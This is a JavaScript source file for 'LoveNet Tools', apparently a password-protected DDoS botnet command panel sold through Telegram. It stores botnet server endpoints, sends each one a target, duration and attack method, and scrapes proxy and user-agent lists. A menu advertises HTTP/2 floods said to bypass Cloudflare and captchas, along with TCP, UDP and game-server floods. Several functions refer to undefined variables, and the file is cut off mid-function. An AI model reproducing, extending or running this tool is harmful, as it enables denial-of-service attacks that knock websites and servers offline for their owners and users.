const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const chalk = require('chalk');
const gradient = require('gradient-string');
const fs = require('fs')
const dns = require('dns');
const { promisify } = require('util');
const Table = require('cli-table3');
const os = require('os');
const fetch = require('node-fetch');
const figlet = require('figlet');
const whois = require('whois-json');
const axios = require('axios')
const path = require('path')
const version = '1.0.0'
let processList = [];

const steven = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})

// 𝐊𝐨𝐧𝐞𝐤𝐬𝐢 𝐊𝐞 𝐌𝐨𝐧𝐠𝐨𝐃𝐁
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //

async function banner() {
console.clear()
console.log(`
[ \x1b[32mSYSTEM\x1b[0m ] Welcome User To LoveNet Tools
[ \x1b[32mSYSTEM\x1b[0m ] Owner Tools: t.me/stevenstoree

\x1b[1m\x1b[31m _       ____   _    ___   _______   __
\x1b[33m| |     / __ \ | |  / / | / /  _/ | / /
\x1b[32m| | /| / / / / | | / /  |/ // //  |/ / 
\x1b[34m| |/ |/ /_/ /  | |/ / /|  // // /|  /  
\x1b[35m|__/|__/\____/  |___/_/ |_/___/_/ |_/   
\x1b[0m
\x1b[31m| \x1b[34mUsername: \x1b[32mStevenStore \x1b[31m| \x1b[34mVip: \x1b[32mTrue \x1b[31m| \x1b[34mSuperVip: \x1b[32mTrue 
\x1b[31m| \x1b[34mAdmin:\x1b[32m True \x1b[31m| \x1b[34mExpired\x1b[32m No Expired\x1b[31m | \x1b[34mTime Limit: \x1b[32m No Limited 
\x1b[31m| \x1b[36mLoveNet-Tools 2025-2030 \x1b[31m| \x1b[36mt.me/stevenstoree\x1b[0m

Please Type \x1b[1m\x1b[32mhelp\x1b[0m For Showing All Menu Tools
\x1b[34m______________________________________________________________________________\x1b[0m
`)}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error Fetching Data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error Fetching Data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
// [========================================] //
// [========================================] //
async function bootup() {
  try {
    console.log('Starting Bootup...');
    
    await exec('npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent');

    // 𝐌𝐞𝐧𝐠𝐚𝐦𝐛𝐢𝐥 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 𝐃𝐚𝐫𝐢 𝐅𝐢𝐥𝐞 𝐩𝐚𝐬𝐬𝐰𝐨𝐫𝐝.𝐭𝐱𝐭
    const secretBangetJir = await fetch('https://raw.githubusercontent.com/StevenBisnis22/cache/refs/heads/main/sigma.txt');
    const password = await secretBangetJir.text();
    console.log('𝐈𝐧𝐩𝐮𝐭 𝐘𝐨𝐮𝐫 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 𝐓𝐨 𝐀𝐜𝐜𝐞𝐬𝐬 𝐓𝐨𝐨𝐥𝐬.');

    // 𝐌𝐞𝐦𝐢𝐧𝐭𝐚 𝐈𝐧𝐩𝐮𝐭 𝐃𝐚𝐫𝐢 𝐏𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐓𝐨𝐨𝐥𝐬 𝐔𝐧𝐭𝐮𝐤 𝐊𝐞𝐲
    steven.question(`\x1b[34m𝐌𝐚𝐬𝐮𝐤𝐤𝐚𝐧-𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝-𝐀𝐧𝐝𝐚\x1b[0m > `, async (skibidi) => {
      if (skibidi === password.trim()) {
        await scrapeProxy();
        await scrapeUserAgent();
        console.log('\x1b[32m𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 𝐈𝐬 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐢𝐫\x1b[0m');
        await sleep(700);
        console.clear();
        console.log(`𝐋 𝐎 𝐕 𝐄 𝐍 𝐄 𝐓 𝐱 𝐓 𝐎 𝐎 𝐋 𝐒`);
        await sleep(1000);
        await banner();
        sigma();
      } else {
        console.log('𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 𝐈𝐬 𝐖𝐫𝐨𝐧𝐠 𝐂𝐮𝐲, 𝐘𝐨𝐮 𝐂𝐚𝐧 𝐁𝐮𝐲 𝐓𝐨𝐨𝐥𝐬 𝐓𝐨 𝐭.𝐦𝐞/𝐬𝐭𝐞𝐯𝐞𝐧𝐬𝐭𝐨𝐫𝐞𝐞 𝐅𝐨𝐫 𝐆𝐞𝐭 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 𝐓𝐨𝐨𝐥𝐬');
        process.exit(-1);
      }
    });

  } catch (error) {
    console.log('Error During Bootup:', error);
    process.exit(-1); 
  }
}
// 𝐅𝐮𝐧𝐠𝐬𝐢 𝐔𝐧𝐭𝐮𝐤 𝐌𝐞𝐧𝐚𝐦𝐩𝐢𝐥𝐤𝐚𝐧 𝐃𝐚𝐟𝐭𝐚𝐫 𝐀𝐩𝐢 𝐒𝐞𝐫𝐯𝐞𝐫 𝐁𝐨𝐭𝐧𝐞𝐭
async function listBotnetEndpoints() {
    let botnetData;
    
    // 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐀𝐩𝐢 𝐒𝐞𝐫𝐯𝐞𝐫 𝐁𝐨𝐭𝐧𝐞𝐭 𝐃𝐚𝐭𝐚
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error Loading Api Server Botnet Data:', error.message);
        botnetData = { endpoints: [] };
    }

    // 𝐉𝐢𝐤𝐚 𝐓𝐢𝐝𝐚𝐤 𝐀𝐝𝐚 𝐀𝐩𝐢 𝐒𝐞𝐫𝐯𝐞𝐫 𝐄𝐧𝐝𝐩𝐨𝐢𝐧𝐭𝐬
    if (botnetData.endpoints.length === 0) {
        console.log('No Api Server Endpoints Found In Botnet.');
        sigma();
        return;
    }

    // 𝐓𝐚𝐦𝐩𝐢𝐥𝐤𝐚𝐧 𝐀𝐩𝐢 𝐒𝐞𝐫𝐯𝐞𝐫 𝐄𝐧𝐝𝐩𝐨𝐢𝐧𝐭𝐬
    console.log('\x1b[1m\x1b[35m[====List Of Api Server Botnet Endpoints====]\x1b[0m');
    botnetData.endpoints.forEach((endpoint, index) => {
        console.log(`${index + 1}. ${endpoint}. ${error.message}`);
    });
    console.log('────────────────────────────────');
     sigma();
}
// [========================================] //
async function deleteBotnetEndpoint(args) {
    if (args.length < 1) {
        console.log(`Example: delapi <Endpoints>
delapi http://1.1.1.1:2000`);
        sigma();
        return;
    }

    const endpointToDelete = args[0];

    // 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐀𝐩𝐢 𝐒𝐞𝐫𝐯𝐞𝐫 𝐁𝐨𝐭𝐧𝐞𝐭 𝐃𝐚𝐭𝐚
    let botnetData;
    try {
        const data = await fs.promises.readFile('./lib/botnet.json', 'utf8');
        botnetData = JSON.parse(data);
    } catch (error) {
        console.error('Error Loading Api Server Botnet Data:', error.message);
        return;
    }

    // 𝐂𝐡𝐞𝐜𝐤 𝐈𝐟 𝐀𝐩𝐢 𝐒𝐞𝐫𝐯𝐞𝐫 𝐄𝐧𝐝𝐩𝐨𝐢𝐧𝐭𝐬 𝐄𝐱𝐢𝐭𝐬
    const index = botnetData.endpoints.indexOf(endpointToDelete);
    if (index === -1) {
        console.log(`Api Server Endpoints ${endpoint} Not Found In The Botnet List.`);
        sigma();
        return;
    }

    // 𝐑𝐞𝐦𝐨𝐯𝐞 𝐀𝐩𝐢 𝐒𝐞𝐫𝐯𝐞𝐫 𝐄𝐧𝐝𝐩𝐨𝐢𝐧𝐭𝐬 𝐁𝐨𝐭𝐧𝐞𝐭
    botnetData.endpoints.splice(index, 1);

    // 𝐒𝐚𝐯𝐞 𝐔𝐩𝐝𝐚𝐭𝐞 𝐃𝐚𝐭𝐚 𝐀𝐩𝐢 𝐒𝐞𝐫𝐯𝐞𝐫 𝐁𝐨𝐭𝐧𝐞𝐭
    try {
        await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
        console.log(`Api Server Endpoints ${endpoint} Has Been Removed From The Botnet.`);
    } catch (error) {
        console.error('Error Saving Api Server Botnet Data:', error.message);
    }

    sigma();
}
//========================================//
async function monitorOngoingAttacks() {
    // 𝐅𝐢𝐥𝐭𝐞𝐫 𝐏𝐫𝐨𝐬𝐞𝐬 𝐘𝐚𝐧𝐠 𝐌𝐚𝐬𝐢𝐡 𝐁𝐞𝐫𝐣𝐚𝐥𝐚𝐧
    processList = processList.filter((process) => {
        const remaining = Math.max(0, Math.floor((process.endTime - Date.now()) / 1000));
        return remaining > 0;
    });

    if (processList.length === 0) {
        console.log("Tidak Ada Data Serangan Botnet Yang Sedang Berlangsung.");
        sigma();
        return;
    }

    // 𝐌𝐞𝐦𝐛𝐮𝐚𝐭 𝐃𝐚𝐭𝐚 𝐓𝐚𝐛𝐞𝐥 𝐒𝐞𝐫𝐚𝐧𝐠𝐚𝐧
    let attackDetails = "\n=== Ongoing Attacks ===\n";
    attackDetails += `┌─────┬──────────────────────┬───────┬──────────┬─────────┐\n`;
    attackDetails += `│  #  │        HOST          │ SINCE │ DURATION │ METHOD  │\n`;
    attackDetails += `├─────┼──────────────────────┼───────┼──────────┼─────────┤\n`;

    // 𝐈𝐬𝐢 𝐃𝐞𝐧𝐠𝐚𝐧 𝐃𝐚𝐭𝐚 𝐘𝐚𝐧𝐠 𝐃𝐢𝐩𝐫𝐨𝐬𝐞𝐬
    processList.forEach((process, index) => {
        const host = process.ip || process.target;
        const since = Math.floor((Date.now() - process.startTime) / 1000);
        const duration = `${process.duration} Sec`; // 𝐌𝐞𝐧𝐚𝐦𝐩𝐢𝐥𝐤𝐚𝐧 𝐃𝐮𝐫𝐚𝐬𝐢 𝐃𝐞𝐧𝐠𝐚𝐧 𝐃𝐞𝐭𝐢𝐤

        // 𝐁𝐚𝐫𝐢𝐬 𝐃𝐚𝐭𝐚
        attackDetails += `│ ${String(index + 1).padEnd(3)} │ ${host.padEnd(20)} │ ${String(since).padEnd(5)} │ ${duration.padEnd(8)} │ ${process.methods.padEnd(7)} │\n`;
    });

    // 𝐆𝐚𝐫𝐢𝐬 𝐁𝐚𝐰𝐚𝐡 𝐓𝐚𝐛𝐞𝐥
    attackDetails += `└─────┴──────────────────────┴───────┴──────────┴─────────┘\n`;

    console.log(attackDetails);
    sigma();
}

// [========================================] //
async function checkBotnetEndpoints() {
    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐀𝐩𝐢 𝐒𝐞𝐫𝐯𝐞𝐫 𝐁𝐨𝐭𝐧𝐞𝐭 𝐃𝐚𝐭𝐚
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error Loading Api Server Botnet Data:', error.message);
        botnetData = { endpoints: [] };
    }

    // 𝐒𝐞𝐧𝐝 𝐑𝐞𝐪𝐮𝐞𝐬𝐭𝐬 𝐓𝐨 𝐄𝐚𝐜𝐡 𝐀𝐩𝐢 𝐒𝐞𝐫𝐯𝐞𝐫 𝐄𝐧𝐝𝐩𝐨𝐢𝐧𝐭𝐬 𝐁𝐨𝐭𝐧𝐞𝐭
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=test&time=1&methods=ninja`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error Sending Request To ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    // 𝐒𝐚𝐯𝐞 𝐕𝐚𝐥𝐢𝐝 𝐀𝐩𝐢 𝐒𝐞𝐫𝐯𝐞𝐫 𝐄𝐧𝐝𝐩𝐨𝐢𝐧𝐭𝐬 𝐁𝐚𝐜𝐤 𝐓𝐨 𝐓𝐡𝐞 𝐅𝐢𝐥𝐞
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error Saving Api Server Botnet Data:', error.message);
        sigma()
    }

    // 𝐑𝐞𝐩𝐥𝐲 𝐖𝐢𝐭𝐡 𝐓𝐡𝐞 𝐑𝐞𝐬𝐮𝐥𝐭𝐬
    console.log(`Checked Api Server Endpoints. ${successCount} Botnet Endpoint(s) Are Online.`);
    sigma()
}
async function Botnethitam(args) {
    if (args.length < 3) {
        console.log(`Example: attack <Target> <Duration> <Methods>
attack https://example.com 60 h2-lovenet`);
        sigma();
        return;
    }

    const [target, duration, methods] = args;
    try {
        const parsing = new url.URL(target);
        const hostname = parsing.hostname;
        const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
        const result = scrape.data;

        let botnetData;
        let successCount = 0;
        const timeout = 20000;
        const validEndpoints = [];

        // 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐀𝐩𝐢 𝐒𝐞𝐫𝐯𝐞𝐫 𝐁𝐨𝐭𝐧𝐞𝐭 𝐃𝐚𝐭𝐚
        try {
            botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
        } catch (error) {
            console.error('Error Loading Api Server Botnet Data:', error.message);
            botnetData = { endpoints: [] };
        }

        // 𝐊𝐢𝐫𝐢𝐦 𝐏𝐞𝐫𝐦𝐢𝐧𝐭𝐚𝐚𝐧 𝐊𝐞 𝐒𝐞𝐭𝐢𝐚𝐩 𝐀𝐩𝐢 𝐒𝐞𝐫𝐯𝐞𝐫 𝐄𝐧𝐝𝐩𝐨𝐢𝐧𝐭𝐬
        const requests = botnetData.endpoints.map(async (endpoint) => {
            const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}`;

            try {
                const response = await axios.get(apiUrl, { timeout });
                if (response.status === 200) {
                    successCount++;
                    validEndpoints.push(endpoint);
                }
            } catch (error) {
                console.error(`Error Sending Request To ${endpoint}: ${error.message}`);
            }
        });

        await Promise.all(requests);

        // 𝐒𝐢𝐦𝐩𝐚𝐧 𝐀𝐩𝐢 𝐒𝐞𝐫𝐯𝐞𝐫 𝐄𝐧𝐝𝐩𝐨𝐢𝐧𝐭𝐬 𝐘𝐚𝐧𝐠 𝐕𝐚𝐥𝐢𝐝 𝐊𝐞𝐦𝐛𝐚𝐥𝐢 𝐊𝐞 𝐅𝐢𝐥𝐞
        botnetData.endpoints = validEndpoints;
        try {
            fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
        } catch (error) {
            console.error('Error Saving Api Server Botnet Data:', error.message);
            sigma();
        }

        // 𝐓𝐚𝐦𝐛𝐚𝐡𝐤𝐚𝐧 𝐏𝐫𝐨𝐬𝐞𝐬 𝐊𝐞 𝐃𝐚𝐟𝐭𝐚𝐫 𝐏𝐫𝐨𝐬𝐞𝐬 𝐀𝐤𝐭𝐢𝐟
        const endTime = Date.now() + duration * 1000;
        processList.push({
            ip: result.query,
            target,
            startTime: Date.now(),
            endTime,
            duration,
            methods,
        });

        // 𝐂𝐞𝐤 𝐃𝐚𝐭𝐚 𝐃𝐞𝐭𝐚𝐢𝐥 𝐒𝐞𝐫𝐚𝐧𝐠𝐚𝐧
        console.clear();
        console.log(`
${chalk.white.bold(`Type ${chalk.red.bold(`"cls"`)} To Return To The Home Menu`)}\n\n
${gradient('cyan', 'blue')("                   ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ ")}${chalk.white.bold("╔═╗╔═╗╔╗╔╔╦╗")}
${gradient('cyan', 'blue')("                   ╠═╣ ║  ║ ╠═╣║  ╠╩╗")}${chalk.white.bold(" ╚═╗║╣ ║║║ ║")}
${gradient('cyan', 'blue')("                   ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩")}${chalk.white.bold(" ╚═╝╚═╝╝╚╝ ╩")}
                            
${gradient('cyan', 'blue')('          ╚╦════════════════════════════════════════════╦╝')}
${gradient('cyan', 'blue')('     ╔═════╩════════════════════════════════════════════╩═════╗')}
${chalk.white.bold(`                       ATTACK TARGET HAS BEEN ${chalk.red.bold('STARTED!')}`)}
${chalk.white.bold(`             TARGET   : [ ${target} ]`)}
${chalk.white.bold(`             TIME      : [ ${duration} ]`)}
${chalk.white.bold(`             METHODS : [ ${methods} ]`)}
${chalk.white.bold(`             AS        : [ ${result.as} ]`)}
${chalk.white.bold(`             ISP        : [ ${result.isp} ]`)}
${chalk.white.bold(`             IP         : [ ${result.query} ]`)}
${chalk.white.bold(`             VIP        : [ True ]`)}
${chalk.white.bold(`             Owner Tools : [ t.me/stevenstoree ]`)}
${gradient('cyan', 'blue')('     ╚════════════════════════════════════════════════════════╝')}
 
`);
        sigma();
    } catch (error) {
        console.error('Terjadi Kesalahan:', error.message);
    }
}
// [========================================] //
async function processBotnetEndpoint(args) {
    if (args.length < 1) {
    console.log(`Example: addsrv <Endpoints>
addsrv http://1.1.1.1:7070/stevenlove`);
    sigma();
	return
  }
    try {
        const parsedUrl = new url.URL(args);
        const hostt = parsedUrl.host;
        const endpoint = 'http://' + hostt + '/stevenlove';

        // 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐀𝐩𝐢 𝐒𝐞𝐫𝐯𝐞𝐫 𝐁𝐨𝐭𝐧𝐞𝐭 𝐃𝐚𝐭𝐚
        let botnetData;
        try {
            const data = await fs.promises.readFile('./lib/botnet.json', 'utf8');
            botnetData = JSON.parse(data);
        } catch (error) {
            console.error('Error Loading Api Server Botnet Data:', error.message);
            botnetData = { endpoints: [] };
        }

        // 𝐂𝐡𝐞𝐜𝐤 𝐈𝐟 𝐀𝐩𝐢 𝐒𝐞𝐫𝐯𝐞𝐫 𝐄𝐧𝐝𝐩𝐨𝐢𝐧𝐭𝐬 𝐀𝐥𝐫𝐞𝐚𝐝𝐲 𝐄𝐱𝐢𝐭𝐬
        if (botnetData.endpoints.includes(endpoint)) {
            return console.log(`Api Server Endpoints ${endpoint} Is Already In The Botnet List.`);
        }

        // 𝐀𝐝𝐝 𝐀𝐩𝐢 𝐒𝐞𝐫𝐯𝐞𝐫 𝐄𝐧𝐝𝐩𝐨𝐢𝐧𝐭𝐬 𝐀𝐧𝐝 𝐒𝐚𝐯𝐞 𝐃𝐚𝐭𝐚 𝐁𝐨𝐭𝐧𝐞𝐭
        botnetData.endpoints.push(endpoint);
        try {
            await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
        } catch (error) {
            console.error('Error Saving Api Server Botnet Data:', error.message);
            return console.log('Error Saving Api Server Botnet Data.');
        }

        // 𝐑𝐞𝐩𝐥𝐲 𝐖𝐢𝐭𝐡 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐌𝐞𝐬𝐬𝐚𝐠𝐞
        console.log(`Api Server Endpoints ${endpoint} Added To Botnet List.`);
        sigma()
    } catch (error) {
        console.error('Error Processing Api Server Botnet Endpoints:', error.message);
        console.log('An Error Occurred While Processing The Endpoints.');
        sigma()
    }
}
// [========================================] //
async function checkBotnetEndpoints() {
    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // 𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐀𝐩𝐢 𝐒𝐞𝐫𝐯𝐞𝐫 𝐁𝐨𝐭𝐧𝐞𝐭 𝐃𝐚𝐭𝐚
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error Loading Api Server Botnet Data:', error.message);
        botnetData = { endpoints: [] };
    }

    // 𝐒𝐞𝐧𝐝 𝐑𝐞𝐪𝐮𝐞𝐬𝐭𝐬 𝐓𝐨 𝐄𝐚𝐜𝐡 𝐀𝐩𝐢 𝐒𝐞𝐫𝐯𝐞𝐫 𝐄𝐧𝐝𝐩𝐨𝐢𝐧𝐭𝐬 𝐁𝐨𝐭𝐧𝐞𝐭
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=test&time=1&methods=ninja`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error Sending Request To ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    // 𝐒𝐚𝐯𝐞 𝐕𝐚𝐥𝐢𝐝 𝐀𝐩𝐢 𝐒𝐞𝐫𝐯𝐞𝐫 𝐄𝐧𝐝𝐩𝐨𝐢𝐧𝐭𝐬 𝐁𝐚𝐜𝐤 𝐓𝐨 𝐓𝐡𝐞 𝐅𝐢𝐥𝐞
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error Saving Api Server Botnet Data:', error.message);
        sigma()
    }

    // 𝐑𝐞𝐩𝐥𝐲 𝐖𝐢𝐭𝐡 𝐓𝐡𝐞 𝐑𝐞𝐬𝐮𝐥𝐭𝐬
    console.log(`Checked Api Server Endpoints. ${successCount} Botnet endpoint(s) Are Online.`);
    sigma()
}
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/StevenBisnis22/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
𝐋𝐨𝐯𝐞𝐍𝐞𝐭-𝐓𝐨𝐨𝐥𝐬 𝐂𝐫𝐞𝐚𝐭𝐞𝐝 𝐁𝐲 t.me/stevenstoree 

𝐒𝐩𝐞𝐜𝐢𝐚𝐥 𝐁𝐞𝐬𝐭 𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨:
> 𝐌𝐚𝐡𝐚 𝐏𝐞𝐧𝐜𝐢𝐩𝐭𝐚
> 𝐎𝐫𝐚𝐧𝐠 𝐓𝐮𝐚
> 𝐏𝐞𝐫𝐦𝐞𝐧𝐌𝐃 ( 𝐁𝐚𝐬𝐞 )
> 𝐒𝐭𝐞𝐯𝐞𝐧𝐒𝐭𝐨𝐫𝐞 ( 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 𝐒𝐜𝐫𝐢𝐩𝐭 )
> 𝐌𝐲 𝐆𝐢𝐫𝐥 ( 𝐌𝐲 𝐁𝐞𝐬𝐭 𝐒𝐮𝐩𝐩𝐨𝐫𝐭 )
> 𝐒𝐚𝐧𝐠 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 ( 𝐌𝐲 𝐓𝐞𝐚𝐜𝐡𝐞𝐫 )
> 𝐌𝐫.𝐄𝐥𝐚𝐧𝐠 𝐂.𝐓.𝐈 ( 𝐊𝐞𝐭𝐮𝐚 𝐓𝐞𝐚𝐦 )
> 𝐀𝐥𝐥 𝐅𝐫𝐢𝐞𝐧𝐝𝐬
> 𝐀𝐥𝐥 𝐓𝐞𝐚𝐦
> 𝐀𝐥𝐥 𝐒𝐮𝐩𝐩𝐨𝐫𝐭
`
steven.question('[\x1b[31m\u001b[47;1m𝐋𝐨𝐯𝐞𝐍𝐞𝐭-𝐓𝐨𝐨𝐥𝐬\x1b[0m] > ', (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'help') {
    console.log(`
\x1b[38;2;173;150;255m 
                          ╦ ╦╔═╗╦  ╔═╗  ╔╦╗╔═╗╔╗╔╦ ╦
                          ╠═╣║╣ ║  ╠═╝  ║║║║╣ ║║║║ ║
                          ╩ ╩╚═╝╩═╝╩    ╩ ╩╚═╝╝╚╝╚═╝.         \x1b[0m
              ═════╦═══════════════════════════════════════╦═════
            ╔═══╦══╩══════╦════════════════════════════════╩═══════╗
            ║ # ║  NAME   ║    DESCRIPTION OF FUNCTION             ║
            ╠═══╬═════════╬════════════════════════════════════════╣
            ║ 1 ║\x1b[1m\x1b[36m methods \x1b[0m║ show methods menu for tools            ║
            ║ 2 ║\x1b[1m\x1b[36m scrape  \x1b[0m║ show your running attack botnet        ║
            ║ 3 ║\x1b[1m\x1b[36m monitor \x1b[0m║ show your running attack               ║
            ║ 4 ║\x1b[1m\x1b[36m cls     \x1b[0m║ clear terminal and return to main page ║
            ║ 5 ║\x1b[1m\x1b[36m listsrv \x1b[0m║ list server botnet panel/vps           ║
            ║ 6 ║\x1b[1m\x1b[36m addsrv  \x1b[0m║ add server botnet panel/vps            ║
            ║ 7 ║\x1b[1m\x1b[36m testsrv \x1b[0m║ cek botnet                             ║
            ║ 8 ║\x1b[1m\x1b[36m attack  \x1b[0m║ attack botnet server                   ║
            ║ 9 ║\x1b[1m\x1b[36m tutorial\x1b[0m║ tutorial penggunaan tools              ║
            ║ 10║\x1b[1m\x1b[36m credits \x1b[0m║ show developer tools and support       ║
            ║ X ║ .....   ║ Type "exit" For Exit To Tools          ║
            ╚═══╩═════════╩════════════════════════════════════════╝
`);
    sigma();
  } else if (command === 'methods') {
    console.log(`
🟢 | Username: StevenStore  | Vip:  True  | Super Vip:  True 
\x1b[38;2;173;150;255m     
         ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔══  ╔═╗╔═╗╔═╗╔═╗   
         ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗  ╠═╝╠═╣║ ╦║╣    
         ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝  ╩  ╩ ╩╚═╝╚═╝   \x1b[0m
     
[ Methods Basic ]
- .[\x1b[1m\x1b[34mbatam\x1b[0m: high request per/s optimized for bypassing uam.
- .[\x1b[1m\x1b[34mspace\x1b[0m: stable request per/s bypassing cloudflare no protect.
- .[\x1b[1m\x1b[34mflash\x1b[0m: flood high request for optimized bypassing cloudflare.
- .[\x1b[1m\x1b[34mmantan\x1b[0m: high request per/s optimized for target no protect.
- .[\x1b[1m\x1b[34mnet-x\x1b[0m: high request per/s, for ISP google llc.

[ Methods VIP ]
- .[\x1b[1m\x1b[38;2;255;165;0mbrowser\x1b[0m: request per/s for bypassing captcha, recaptcha, uam.
- .[\x1b[1m\x1b[38;2;255;165;0mlovenet-x\x1b[0m: HTTP/2 stable requests, optimized for bypass no protect.
- .[\x1b[1m\x1b[38;2;255;165;0mlovenet-flash\x1b[0m: HTTP/2 for bypassing cloudflare, HTTP DDoS.
- .[\x1b[1m\x1b[38;2;255;165;0mlovenet-space\x1b[0m: HTTP/2 high requests per/s bypassing cloudflare.
- .[\x1b[1m\x1b[38;2;255;165;0mlovenet-steven\x1b[0m: high request per/s optimized for bypassing uam.
- .[\x1b[1m\x1b[38;2;255;165;0mlovenet-death\x1b[0m: HTTP/2 LoveNet source, for bypassing cloudflare.
- .[\x1b[1m\x1b[38;2;255;165;0mlovenet-panel\x1b[0m: HTTP/2 LoveNet source, for attack pterodactyl.

[ Methods Layer 4 ]
- .[\x1b[1m\x1b[38;2;255;255;0mtcp\x1b[0m: strong TCP flood with high packet for optimized pps.
- .[\x1b[1m\x1b[38;2;255;255;0mudp\x1b[0m: UDP flood with high packet for optimized gbps.
- .[\x1b[1m\x1b[38;2;255;255;0mkill-ping\x1b[0m: KILL-PING flood with high packet for optimized ping.
- .[\x1b[1m\x1b[38;2;255;255;0mkill-do\x1b[0m: strong KILL-DO flood with high packet for optimized vps.
- .[\x1b[1m\x1b[38;2;255;255;0msamp\x1b[0m: strong SAMP flood with high packet for optimized gta.
- .[\x1b[1m\x1b[38;2;255;255;0mmc\x1b[0m: strong MC flood with high packet for optimized minecraft.
`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'news') {
    console.log(`
${latestNews}`);
    sigma();
  } else if (command === 'setname') {
    const name = args[0] || 'Steven-Stresser'; 
    const settings = loadSettings();
    settings.name = name;
    saveSettings(settings);
    sett();
    sigma();
  } else if (command === 'scrape') {
    exec('node ./tools/scrape.js', (error, stdout, stderr) => {
        if (error) {
            console.error(`Error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.error(`stderr: ${stderr}`);
            return;
        }
        console.log(`stdout: ${stdout}`);
    });
    
    sigma();
  } else if (command === 'adduser') {
    addUser(username, password, VIP, maxtime);
  } else if (command === 'listsrv') {
    listBotnetEndpoints();    
  } else if (command === 'addsrv') {
    processBotnetEndpoint(args);
  } else if (command === 'testsrv') {
    checkBotnetEndpoints()
  } else if (command === 'tutorial') {
  	console.log(`
 Tutorial Menggunakan
 Attack Target Time Methods
 Contoh => attack https://example.com 60 h2-lovenet`);
  } else if (command === 'attack') {
    Botnethitam(args);
  } else if (command === 'attack') {
    handleAttackCommand(args);
  } else if (command === 'monitor') {
    monitorOngoingAttacks()
    sigma()
  } else if (command === 'cls') {
    banner()
    sigma()
  } else if (command === 'exit') {
  process.exit(-1)    
    } else {
    console.log(`${command} 𝐍𝐨𝐭 𝐅𝐨𝐮𝐧𝐝`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
